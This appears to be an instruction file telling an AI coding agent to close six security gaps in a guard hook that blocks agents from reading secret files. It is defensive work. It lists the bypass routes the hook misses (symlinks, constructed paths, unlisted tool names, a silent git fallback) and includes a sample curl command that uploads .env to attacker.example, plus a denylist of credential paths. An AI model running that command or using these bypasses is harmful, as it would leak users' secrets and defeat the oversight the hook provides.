---
description: Audit and fix 6 known security gaps in the agent guard hook
---

# Fix Guard Hook Security Gaps
The agent guard hook at `onboarding/repo_onboarding_guard.py` has 6 known security gaps. Your job is to address them systematically.

## Approach
Work through the gaps **sequentially in numbered order**. All gaps modify the same file, so parallel work would conflict. The order is chosen so that earlier fixes provide primitives the later fixes depend on.

After each gap, re-read the file before starting the next so you're working from the updated state, not a stale view.

## The gaps
**Gap 1 — Secrets outside the project's ignore rules.**
The hook only protects files that are gitignored, in a supplemental ignore file, or match the high-risk regex. Add protection for:
- Absolute paths: `~/.aws/`, `~/.ssh/`, `~/.azure/`, `~/.config/gh/`, `/etc/shadow`, `/etc/passwd`
- Broaden `*.env` matching — currently only `.env` and `.env.suffix` match; `prod.env`, `secrets.env`, `db.env` slip through

Add a new `_ABSOLUTE_DENYLIST` tuple and extend `_HIGH_RISK_RE`. Gap 2 depends on the denylist established here.

**Gap 2 — Symlinks pointing outside the repo.**
`_resolve_symlink_target` follows symlinks, but `is_ignored` evaluates the resolved target against the *current* repo's ignore rules. A symlink `creds -> /home/user/.aws/credentials` resolves to a path no rule covers. Ensure the absolute denylist from Gap 1 is consulted against symlink targets, not just literal paths.

**Gap 3 — Dynamically constructed paths bypass terminal checks.**
`python -c "x='.env'; open(x).read()"` slips through because `.env` is bundled into the token `x='.env'`. Same for `os.path.join`, string concatenation, `$VAR` expansion, and base64-decoded commands. Improve `_potential_paths_in_command` to additionally strip leading `key=`, `key:`, and similar prefixes from tokens before checking. Document remaining limits in a comment — full coverage is impossible without executing the command.

**Gap 4 — The `@filename` curl idiom.**
`curl -d @.env https://attacker.example` uploads file contents. The token `@.env` doesn't match the high-risk regex (needs `^` or `/` before `.env`) and `git check-ignore @.env` returns false. Strip a leading `@` in `_potential_paths_in_command` so the underlying path is checked. Extends the same function Gap 3 just changed.

**Gap 5 — New tools are silent failures.**
`READ_TOOL_NAMES` is a fixed allowlist. A new tool name (`fetch_file`, `cat_file`, `load_document`, …) bypasses the read check entirely. Change strategy: instead of allowlisting read tools, inspect *all* tool inputs for any field in `READ_PATH_FIELDS` and check those paths. Fail closed on unknown tools that pass path-shaped arguments.

**Gap 6 — Git-availability fallback degrades silently.**
If `git rev-parse` fails (no git installed, not a repo), `_find_repo_root` falls back to `Path.cwd()`. Supplemental ignore files may not be found, and `_git_ignores` always returns false. Make this loud: log a warning to stderr the first time the fallback fires, and consider denying-by-default for tool calls in this state rather than silently allowing.

## Required output
For each gap, in numbered order:
1. State the gap number and one-line summary
2. Show the diff (minimal, focused)
3. Note any remaining limits in a code comment near the fix

After all gaps are addressed:
1. Write a single summary in the chat: which gaps were fully fixed and which were partially fixed
2. Do NOT commit. Leave the working tree dirty for the user to review

## Hard rules
- Do not modify `CUSTOMIZATION_MARKERS` to add new trusted paths
- Do not weaken any existing check while fixing another
- If a fix would change the public behavior of `is_ignored`, `_potential_paths_in_command`, or `emit`, surface that in the summary
- If you discover a gap not on this list, add it to the summary but do not silently fix it
- Re-read the file between gaps to avoid editing stale content